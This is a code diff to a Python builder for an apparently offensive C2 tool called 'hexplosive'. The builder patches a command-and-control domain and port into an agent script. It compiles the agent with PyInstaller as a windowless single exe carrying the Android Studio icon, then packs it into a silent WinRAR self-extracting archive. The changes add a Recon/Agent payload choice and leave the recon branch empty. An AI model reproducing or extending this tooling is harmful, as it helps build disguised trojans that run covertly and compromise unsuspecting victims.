@@ -15,14 +15,18 @@ port = config["c2Port"]
 
 # customise agent
 def input():
-    name = input("Name your payload: ")
+    while True:
+        payload_type = input("Payload type (Recon/Agent):")
+        if payload_type == "Agent" or payload_type == "Recon":
+            break
+    payload_name = input("Name your payload: ")
     ico_path = ""
     while not ico_path.endswith(".ico"):
         ico_path = input("Enter ICO file path: ")
-    return name, ico_path
+    return payload_name, ico_path, payload_type
 
 
-def generate(name):
+def generate(name,payload_type):
     
     base = "./payloads/"
     ext = ".py"
@@ -31,26 +35,32 @@ def generate(name):
     counter = 1
     while os.path.exists(name):
         counter += 1
-        agent = f"{base}_{name}{counter}{ext}"
-    shutil.copy("hexplosive-agent.py", agent)
-
-    # mod with server config
-    with open(agent, "r", encoding="utf8") as f:
-        lines = f.readlines()
-        lines[102] = lines[102].replace('<placeholder.your.domain.name>', domain).replace('0000', str(port))
-        lines[105] = lines[105].replace('<placeholder.your.domain.name>', domain).replace('0000', str(port))
+        payload_file = f"{base}_{name}{counter}{ext}"
+    
+    # agent config 
+    if payload_type == "Agent":
         
-    with open(agent, "w", encoding="utf8") as f:
-        f.writelines(lines)
-    return agent
+        # mod with server config
+        shutil.copy("hexplosive-agent.py", payload_file)
+        with open(payload_file, "r", encoding="utf8") as f:
+            lines = f.readlines()
+            lines[102] = lines[102].replace('<placeholder.your.domain.name>', domain).replace('0000', str(port))
+            lines[105] = lines[105].replace('<placeholder.your.domain.name>', domain).replace('0000', str(port))
+            with open(payload_file, "w", encoding="utf8") as f:
+                f.writelines(lines)
+        return payload_file
+    
+    # recce config
+    else:
+        pass
     
     
 def compile():
     
     # testcase
-    agentpy = "./payloads/agent.py"
-    exe = "agent"
-    ico = "C:/Program Files/Android/Android Studio/bin/studio.ico"
+    agent_py = "./payloads/agent.py"
+    payload_name = "agent"
+    ico_path = "C:/Program Files/Android/Android Studio/bin/studio.ico"
     
     # # path of exe in 'C:/Program Files'
     # payload_path = os.path.dirname(ico) + "\\" + exe + ".exe"
@@ -68,64 +78,64 @@ def compile():
     # compilation
     try:
         PyInstaller.__main__.run([
-            agentpy,
+            agent_py,
             '--noconsole',
             '--onefile',
             '--distpath=./payloads',
-            '--icon='+ ico
+            '--icon='+ ico_path
         ])
         
         # remove unused folders & spec file
         shutil.rmtree("./build", ignore_errors=True)
         shutil.rmtree("./dist", ignore_errors=True)
-        os.remove(exe+".spec")
+        os.remove(payload_name +".spec")
         
     except Exception as e:
         print("Error occured during pyinstaller compilation.")
     
     
     
-def createSFX(name,ico): 
+def createSFX(payload_name,ico): 
     try:
-        # Path to WinRAR
-        path_win = "C:/Program Files/WinRAR/WinRAR.exe"
+        # path to WinRAR
+        winrar_path = "C:/Program Files/WinRAR/WinRAR.exe"
         
-        # config for sfx
-        config_content = f"""
-        Setup={name}.exe
-        TempMode
-        Silent=1
-        Overwrite=1
-        Update=U
-        """
+        # config for SFX
+#         config_content = f"""
+# Setup={payload_name}.exe
+# TempMode
+# Silent=1
+# Overwrite=1
+# Update=U
+#         """
 
-        # write to config.txt
-        with open("./config.txt", "w") as config_file:
-            config_file.write(config_content)
+#         # write SFX config to config.txt
+#         with open("./config.txt", "w") as config_file:
+#             config_file.write(config_content)
 
-        # Convert to SFX with icon and config
+        # convert to SFX with icon and config
         subprocess.run([
-            path_win,
+            winrar_path,
             "a",
             "-sfx",  
             "-iicon" + ico,
             "-zconfig.txt",
             "-r",
             "-ep1",
-            "payloads/"+name+"rar",
-            'payloads/'+name+'.exe'
+            "payloads/" + "testing.rar",
+            'payloads/'+ payload_name +'.exe'
         ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                # extract archive
     except Exception as e:
         print("Error creating SFX")
 
 
 
-# name, ico = input()   
-# agentpy = generate(name)
+# name, ico, payload_type = input()   
+# agentpy = generate(name, payload_type)
 # compile(agentpy,name,ico)
 # createSFX(name,ico)
 compile()
+createSFX("agent","C:/Program Files/Android/Android Studio/bin/studio.ico")
 
 
 # exe = "android studio"
